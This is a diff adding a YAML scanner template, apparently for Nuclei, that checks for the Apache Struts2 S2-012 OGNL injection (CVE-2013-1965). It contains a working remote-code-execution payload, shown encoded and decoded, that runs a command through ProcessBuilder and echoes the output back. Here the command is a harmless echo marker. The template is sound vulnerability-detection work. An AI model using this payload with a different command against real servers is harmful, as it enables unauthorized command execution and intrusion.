@@ -1,0 +1,43 @@
+id: local-struts2-s2-012-cmd-rce
+
+info:
+  name: Struts2 S2-012 Command Execution via Redirect Result OGNL (CVE-2013-1965)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-012 RCE via OGNL injection in redirect result variable
+    substitution. The "name" parameter is embedded as ${name} in a redirect URL,
+    and Struts evaluates it as OGNL. Payload uses ProcessBuilder to execute echo
+    and returns output via HttpServletResponse.getWriter().
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-012
+    - https://nvd.nist.gov/vuln/detail/CVE-2013-1965
+  tags: safe-poc,exploit,struts2,s2-012,cve,cve2013,rce,ognl
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/user/profile.action"
+      - "{{BaseURL}}/user.action"
+      - "{{BaseURL}}/index.action"
+    # Decoded payload:
+    # %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"echo","pentest-platform-s2012-rce"}))
+    #     .redirectErrorStream(true).start(),
+    #   #b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),
+    #   #d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),
+    #   #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
+    #   #f.getWriter().println(new java.lang.String(#e)),
+    #   #f.getWriter().flush(),#f.getWriter().close()}
+    body: "name=%25%7B%23a%3D(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B%22echo%22%2C%22pentest-platform-s2012-rce%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew+java.io.InputStreamReader(%23b)%2C%23d%3Dnew+java.io.BufferedReader(%23c)%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new+java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest-platform-s2012-rce"
+      - type: status
+        status:
+          - 200
